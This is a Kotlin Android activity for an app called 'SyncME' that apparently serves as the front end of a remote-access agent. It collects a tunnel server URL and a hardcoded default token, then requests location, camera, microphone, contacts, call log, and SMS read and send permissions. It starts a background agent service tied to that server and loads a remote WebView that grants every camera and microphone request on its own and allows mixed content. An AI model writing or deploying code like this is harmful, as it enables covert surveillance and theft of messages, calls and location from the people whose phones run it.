package com.syncme.app

import android.Manifest
import android.content.Intent
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.webkit.*
import android.widget.*
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.syncme.app.databinding.ActivityMainBinding

class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding
    private lateinit var prefs: SharedPreferences

    companion object {
        const val PREF_SERVER  = "server_url"
        const val PREF_TOKEN   = "auth_token"
        const val PREF_NAME    = "device_name"
        const val DEFAULT_TOKEN = "syncbridge-token-2024"
    }

    private val PERMISSIONS = buildList {
        add(Manifest.permission.ACCESS_FINE_LOCATION)
        add(Manifest.permission.CAMERA)
        add(Manifest.permission.RECORD_AUDIO)
        add(Manifest.permission.READ_CONTACTS)
        add(Manifest.permission.READ_CALL_LOG)
        add(Manifest.permission.READ_SMS)
        add(Manifest.permission.SEND_SMS)
        add(Manifest.permission.READ_PHONE_STATE)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
            add(Manifest.permission.POST_NOTIFICATIONS)
    }.toTypedArray()

    private val permLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { startAgentService() }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        prefs = getSharedPreferences("syncme", MODE_PRIVATE)

        if (prefs.getString(PREF_SERVER, "").isNullOrEmpty()) {
            showSetupDialog()
        } else {
            loadDashboard()
            requestPermissions()
        }
    }

    private fun showSetupDialog() {
        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(48, 32, 48, 16)
        }
        val etServer = EditText(this).apply { hint = "https://your-tunnel.ms" }
        val etToken  = EditText(this).apply { hint = "Token"; setText(DEFAULT_TOKEN) }
        val etName   = EditText(this).apply { hint = "Device name"; setText(Build.MODEL) }
        layout.addView(TextView(this).apply { text = "Server URL" })
        layout.addView(etServer)
        layout.addView(TextView(this).apply { text = "Token"; setPadding(0,16,0,0) })
        layout.addView(etToken)
        layout.addView(TextView(this).apply { text = "Device Name"; setPadding(0,16,0,0) })
        layout.addView(etName)

        AlertDialog.Builder(this)
            .setTitle("⚡ SyncME Setup")
            .setView(layout)
            .setPositiveButton("Connect") { _, _ ->
                val server = etServer.text.toString().trim().trimEnd('/')
                if (server.isEmpty()) { Toast.makeText(this,"Enter server URL",Toast.LENGTH_SHORT).show(); return@setPositiveButton }
                prefs.edit()
                    .putString(PREF_SERVER, server)
                    .putString(PREF_TOKEN,  etToken.text.toString().trim())
                    .putString(PREF_NAME,   etName.text.toString().trim().ifEmpty { Build.MODEL })
                    .apply()
                loadDashboard()
                requestPermissions()
            }
            .setCancelable(false)
            .show()
    }

    private fun loadDashboard() {
        val server = prefs.getString(PREF_SERVER, "") ?: return
        val token  = prefs.getString(PREF_TOKEN, DEFAULT_TOKEN) ?: DEFAULT_TOKEN

        binding.webView.apply {
            settings.apply {
                javaScriptEnabled = true
                domStorageEnabled = true
                mixedContentMode  = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
                userAgentString   = "SyncME/3.2 Android/${Build.VERSION.RELEASE}"
                mediaPlaybackRequiresUserGesture = false
            }
            webChromeClient = object : WebChromeClient() {
                override fun onPermissionRequest(req: PermissionRequest) { req.grant(req.resources) }
            }
            webViewClient = WebViewClient()
            addJavascriptInterface(JSBridge(this@MainActivity, prefs), "SyncME")
            loadUrl("$server/?token=$token")
        }
    }

    private fun requestPermissions() {
        val missing = PERMISSIONS.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (missing.isNotEmpty()) permLauncher.launch(missing.toTypedArray())
        else startAgentService()
    }

    private fun startAgentService() {
        val server = prefs.getString(PREF_SERVER, "") ?: return
        if (server.isEmpty()) return
        val i = Intent(this, SyncMEService::class.java).apply {
            putExtra("server", server)
            putExtra("token",  prefs.getString(PREF_TOKEN, DEFAULT_TOKEN))
            putExtra("name",   prefs.getString(PREF_NAME, Build.MODEL))
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(i)
        else startService(i)
    }

    override fun onBackPressed() {
        if (binding.webView.canGoBack()) binding.webView.goBack()
        else super.onBackPressed()
    }
}

// JavaScript bridge accessible from WebView as window.SyncME
class JSBridge(private val act: MainActivity, private val prefs: SharedPreferences) {
    @android.webkit.JavascriptInterface
    fun getServer() = prefs.getString(MainActivity.PREF_SERVER, "") ?: ""
    @android.webkit.JavascriptInterface
    fun isRunning() = SyncMEService.running
    @android.webkit.JavascriptInterface
    fun getModel() = Build.MODEL
    @android.webkit.JavascriptInterface
    fun getAndroidVersion() = Build.VERSION.RELEASE
}
